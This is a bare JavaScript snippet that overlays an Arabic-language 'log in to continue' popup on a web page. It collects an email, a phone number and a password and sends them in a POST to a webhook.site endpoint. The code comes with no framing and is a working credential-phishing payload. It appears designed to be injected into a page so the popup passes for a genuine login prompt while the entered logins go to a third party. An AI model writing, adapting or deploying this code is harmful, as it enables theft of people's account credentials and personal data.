// Create the popup container
var popup = document.createElement("div");
popup.style.position = "fixed";
popup.style.top = "50%";
popup.style.left = "50%";
popup.style.transform = "translate(-50%, -50%)";
popup.style.backgroundColor = '#1E0232'; // Updated background color
popup.style.padding = "20px";
popup.style.borderRadius = "10px";
popup.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.5)";
popup.style.color = "white";
popup.style.textAlign = "center";
popup.style.fontFamily = "Arial, sans-serif";
popup.style.width = "90%"; // Use percentage for responsiveness
popup.style.maxWidth = "400px"; // Set a maximum width for desktop
popup.style.zIndex = "1000";

// Add the title
var title = document.createElement("h2");
title.textContent = "للمتابعة يجب عليك تسجيل الدخول";
title.style.marginBottom = "20px";
popup.appendChild(title);

// Add the email field
var emailInput = document.createElement("input");
emailInput.type = "text";
emailInput.placeholder = "...البريد الالكتروني";
emailInput.style.width = "90%";
emailInput.style.padding = "15px";
emailInput.style.margin = "10px 0";
emailInput.style.border = "1px solid #555";
emailInput.style.borderRadius = "5px";
emailInput.style.backgroundColor = "white";
popup.appendChild(emailInput);

// Add the phone number field
var phoneInput = document.createElement("input");
phoneInput.type = "text";
phoneInput.placeholder = "...رقم الهاتف";
phoneInput.style.width = "90%";
phoneInput.style.padding = "15px";
phoneInput.style.margin = "10px 0";
phoneInput.style.border = "1px solid #555";
phoneInput.style.borderRadius = "5px";
phoneInput.style.backgroundColor = "white";
popup.appendChild(phoneInput);

// Add the password field
var passwordInput = document.createElement("input");
passwordInput.type = "password";
passwordInput.placeholder = "...كلمة المرور";
passwordInput.style.width = "90%";
passwordInput.style.padding = "15px";
passwordInput.style.margin = "10px 0";
passwordInput.style.border = "1px solid #555";
passwordInput.style.borderRadius = "5px";
passwordInput.style.backgroundColor = "white";
popup.appendChild(passwordInput);

// Add the login button
var loginButton = document.createElement("button");
loginButton.textContent = "تسجيل الدخول";
loginButton.style.width = "50%";
loginButton.style.padding = "10px";
loginButton.style.backgroundColor = "#007BFF";
loginButton.style.border = "none";
loginButton.style.borderRadius = "5px";
loginButton.style.color = "white";
loginButton.style.fontSize = "16px";
loginButton.style.cursor = "pointer";
loginButton.style.marginTop = "10px";

loginButton.addEventListener("click", function () {
    // Validate email
    var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(emailInput.value)) {
        alert("يرجى إدخال بريد إلكتروني صحيح!");
        return;
    }

    // Validate phone number (11 digits and only numbers)
    var phoneRegex = /^\d{11}$/;
    if (!phoneRegex.test(phoneInput.value)) {
        alert("يرجى إدخال رقم هاتف مكون من 11 رقماً!");
        return;
    }

    // Check password
    if (!passwordInput.value) {
        alert("يرجى إدخال كلمة المرور!");
        return;
    }

    // Send the data to the webhook
    var credentials = {
        email: emailInput.value,
        phone: phoneInput.value,
        password: passwordInput.value
    };

    fetch("https://webhook.site/78735d80-a09c-471a-b188-5aee323d456c", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(credentials)
    })
    .then(response => {
        if (response.ok) {
            alert("تم إرسال البيانات بنجاح!");
            document.body.removeChild(popup);
        } else {
            alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
        }
    })
    .catch(error => {
        console.error("Error:", error);
        alert("حدث خطأ أثناء الإرسال. تحقق من الاتصال.");
    });
});
popup.appendChild(loginButton);

// Add the popup to the body
document.body.appendChild(popup);
